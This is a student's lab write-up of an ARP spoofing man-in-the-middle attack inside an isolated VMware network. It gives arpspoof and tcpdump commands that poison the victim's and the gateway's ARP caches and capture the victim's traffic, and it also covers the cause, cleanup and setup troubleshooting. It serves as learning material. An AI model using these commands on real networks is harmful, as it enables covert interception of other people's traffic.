# ARP Spoofing / MiTM Lab Writeup

## Overview

Long time since I've touched anything CCNA'ish or network related. Needed to do a lab for an assignment I got simulating an ARP spoofing attack.

ARP spoofing is a Man-in-the-Middle (MiTM) attack that exploits the stateless, trust-based nature of the ARP protocol. ARP has no authentication — any host can assert ownership of any IP address, and other hosts will update their cache accordingly.

The attacker sends forged ARP replies to two targets simultaneously:
- Tell the **victim**: "I am the gateway"
- Tell the **gateway**: "I am the victim"

All traffic between them now flows through the attacker transparently.

---

## Lab Topology

```
[Kali - Attacker]        [Windows Server 2019 - Victim]
  192.168.113.128    ←→        192.168.113.50
          ↕                          ↕
     [Ubuntu Host - Gateway]
          192.168.113.1 (vmnet1)
```

| Role     | OS                   | IP               | MAC               |
|----------|----------------------|------------------|-------------------|
| Attacker | Kali Linux           | 192.168.113.128  | 00:0c:29:7b:8e:d5 |
| Victim   | Windows Server 2019  | 192.168.113.50   | (real MAC)        |
| Gateway  | Ubuntu 24 (host)     | 192.168.113.1    | 00:50:56:c0:00:01 |

**Network:** VMware vmnet1 (host-only) — fully isolated, no internet, no exposure to home LAN.

---

## Attack Steps

### 1. Enable IP Forwarding on Kali

Without this, Kali drops intercepted packets instead of forwarding them — victim loses connectivity and the attack becomes visible.

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### 2. Poison the Victim's ARP Cache

Tell the victim (`192.168.113.50`) that the gateway (`192.168.113.1`) is at Kali's MAC:

```bash
sudo arpspoof -i eth0 -t 192.168.113.50 192.168.113.1
```

### 3. Poison the Gateway's ARP Cache

Tell the gateway (`192.168.113.1`) that the victim (`192.168.113.50`) is at Kali's MAC:

```bash
sudo arpspoof -i eth0 -t 192.168.113.1 192.168.113.50
```

Run steps 2 and 3 in separate terminals simultaneously. arpspoof sends continuous gratuitous ARP replies to maintain the poisoned state.

### 4. Verify the Poison

On the Windows victim:

```cmd
arp -a
```

Expected output — both gateway and Kali entries show Kali's MAC:

```
192.168.113.1    00-0c-29-7b-8e-d5   dynamic   ← poisoned (real: 00-50-56-c0-00-01)
192.168.113.128  00-0c-29-7b-8e-d5   dynamic
```

### 5. Intercept Traffic

On Kali:

```bash
sudo tcpdump -i eth0 -n not arp
```

Sample intercepted output:

```
192.168.113.50.63632 > 172.16.61.2.53: A? ecs.office.com.
192.168.113.50.62397 > 172.16.61.2.53: A? www.bing.com.
192.168.113.50 > 1.1.1.1: ICMP echo request
192.168.113.50.137 > 192.168.113.255.137: UDP (NetBIOS)
```

Kali is seeing all victim traffic in plaintext — DNS queries, ICMP, NetBIOS broadcasts. In a network with real internet access this traffic would be forwarded transparently and the victim would have no indication of interception.

---

## Why It Works

ARP is stateless and unauthenticated by design. Hosts accept ARP replies without verifying:
- Whether they sent a request
- Whether the sender is authoritative for that IP
- Whether the MAC-to-IP mapping has changed

This makes ARP cache poisoning trivially easy on any unsegmented L2 network.

---

## Cleanup

Restore host settings after the lab:

```bash
# Remove nftables ICMP rule added for lab
sudo nft delete rule inet filter input iifname "vmnet1" icmp type echo-request accept

# Restore rp_filter
sudo sysctl -w net.ipv4.conf.all.rp_filter=1
sudo sysctl -w net.ipv4.conf.vmnet1.rp_filter=1
```

Revert Windows VM to snapshot to restore original NIC/IP config.

---

## Appendix: Lab Setup Troubleshooting

The following issues were encountered during lab setup and are documented for reference.

---

### A. Kali → Host Ping Failing: Network Unreachable

**Symptom:** `ping: connect: Network is unreachable`

**Cause:** No default route on Kali.

**Fix:**
```bash
sudo ip route add default via 192.168.113.1
```

---

### B. Ping Still Failing After Route Added

**Symptom:** 100% packet loss despite correct routing table and ARP entry.

**Diagnosis:** `sudo tcpdump -i any icmp` on the host showed packets arriving on vmnet1 but no replies generated on any interface.

**Root Cause 1:** `rp_filter` set to `1` on both `vmnet1` and `all`:

```bash
sysctl net.ipv4.conf.vmnet1.rp_filter  # returned 1
sysctl net.ipv4.conf.all.rp_filter     # returned 1
```

Linux uses the **max** of `all` and the interface-specific value. Setting only the interface value is insufficient.

**Fix:**
```bash
sudo sysctl -w net.ipv4.conf.vmnet1.rp_filter=0
sudo sysctl -w net.ipv4.conf.all.rp_filter=0
```

**Root Cause 2:** nftables ruleset with `policy drop` on the input chain, no ICMP accept rule:

```
chain input {
    type filter hook input priority filter; policy drop;
    iifname "lo" accept
    ct state established,related accept
    # no ICMP rule — new echo requests dropped silently
}
```

Note: `ufw` and `iptables` showed clean rulesets. The blocking ruleset was in `nftables`, which runs independently and takes precedence. Always check `sudo nft list ruleset` when iptables appears clean but traffic is still blocked.

**Fix:**
```bash
sudo nft add rule inet filter input iifname "vmnet1" icmp type echo-request accept
```

---

### C. sudo Redirect Permission Denied

**Symptom:**
```
zsh: permission denied: /proc/sys/net/ipv4/ip_forward
```

Even with `sudo echo 1 > /proc/sys/net/ipv4/ip_forward` — the redirect runs as the unprivileged user, not root.

**Fix:**
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

### D. tcpdump Output Appearing in ping Output

**Symptom:** ping output mixed with tcpdump lines, no clean statistics.

**Cause:** Background tcpdump jobs still running on the same terminal session.

**Fix:**
```bash
kill %1 %2 2>/dev/null
wait
ping -c 3 192.168.113.1
```

---

### E. Windows VM Static IP Not Taking Effect on First Try

**Symptom:** First `netsh` command appeared to succeed but ping failed immediately after.

**Fix:** Re-run the same command — on the second attempt the IP was applied correctly and ping succeeded. Likely a NIC initialization delay after switching VMware network adapter.

```cmd
netsh interface ip set address "Ethernet0" static 192.168.113.50 255.255.255.0 192.168.113.1
```
UBUNTU HOST ip -a
<img width="1526" height="675" alt="IPSETUPUBUNTUHOST" src="https://github.com/user-attachments/assets/b0ac81c4-8e8d-4b8b-9c57-5629c403a195" />

Attacker setup (Kali) stating to host that it is the victim and that it is the gateway to the victim:
<img width="1858" height="1045" alt="Arpspoofattackcommands" src="https://github.com/user-attachments/assets/7522e96a-cbe6-4024-8f89-2915f5cd083e" />

Victim traffic. Used a Windows AD DC as Windows is quite chatty:

<img width="1246" height="1072" alt="VictimtrafficDC01" src="https://github.com/user-attachments/assets/e762b80d-7f3e-41c0-b85d-58d72e584adc" />




